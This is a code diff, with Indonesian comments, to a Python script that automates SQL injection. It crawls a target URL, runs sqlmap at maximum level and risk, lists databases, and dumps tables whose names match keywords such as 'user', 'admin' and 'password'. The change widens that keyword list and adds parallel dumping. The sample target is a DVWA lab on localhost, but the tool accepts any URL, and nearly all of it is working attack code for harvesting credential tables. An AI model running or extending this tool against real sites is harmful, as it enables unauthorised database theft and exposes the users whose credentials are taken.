@@ -9,8 +9,9 @@ import os
 # Konfigurasi
 CRAWL_LIMIT = 100
 MAX_THREADS = 10
-SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH
-TARGET_KEYWORDS = ["user", "admin", "login"]  # Tabel yang akan didump
+DUMP_THREADS = 5
+SQLMAP_PATH = "sqlmap"
+TARGET_KEYWORDS = ["user", "username", "admin", "pass", "password", "login"]
 
 VISITED = set()
 URLS_WITH_PARAMS = []
@@ -52,7 +53,7 @@ def test_sqlmap(url):
         print(f"[-] Tidak rentan: {url}")
 
 def run_targeted_dump(url):
-    """Cari DB, tabel sesuai keyword, lalu dump"""
+    """Cari DB, tabel sesuai keyword, lalu dump paralel"""
     print("[*] Mencari database...")
     dbs_cmd = [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--threads=10", "--dbs"]
     dbs_result = subprocess.run(dbs_cmd, capture_output=True, text=True)
@@ -64,6 +65,19 @@ def run_targeted_dump(url):
 
     output_file = f"hasil_dump_{urlparse(url).netloc}.txt"
     with open(output_file, "a", encoding="utf-8") as f:
+
+        def dump_table(db, table):
+            print(f"[Dump] {db}.{table}")
+            dump_cmd = [
+                SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3",
+                "--threads=10", "-D", db, "-T", table, "--dump"
+            ]
+            dump_result = subprocess.run(dump_cmd, capture_output=True, text=True)
+            print(dump_result.stdout)
+            with open(output_file, "a", encoding="utf-8") as fw:
+                fw.write(f"\n=== {db}.{table} ===\n")
+                fw.write(dump_result.stdout + "\n")
+
         for db in databases:
             print(f"[DB] {db}")
             print(f"[*] Mencari tabel di {db}...")
@@ -71,16 +85,12 @@ def run_targeted_dump(url):
             tables_result = subprocess.run(tables_cmd, capture_output=True, text=True)
             tables = re.findall(r"\|\s*(\w+)\s*\|", tables_result.stdout)
 
-            for table in tables:
-                if any(keyword.lower() in table.lower() for keyword in TARGET_KEYWORDS):
-                    print(f"[Dump] {db}.{table}")
-                    dump_cmd = [
-                        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3",
-                        "--threads=10", "-D", db, "-T", table, "--dump"
-                    ]
-                    dump_result = subprocess.run(dump_cmd, capture_output=True, text=True)
-                    print(dump_result.stdout)
-                    f.write(dump_result.stdout + "\n")
+            # Filter tabel sesuai keyword
+            filtered_tables = [t for t in tables if any(k.lower() in t.lower() for k in TARGET_KEYWORDS)]
+
+            # Jalankan dump tabel paralel
+            with ThreadPoolExecutor(max_workers=DUMP_THREADS) as executor:
+                executor.map(lambda tbl: dump_table(db, tbl), filtered_tables)
 
 if __name__ == "__main__":
     TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
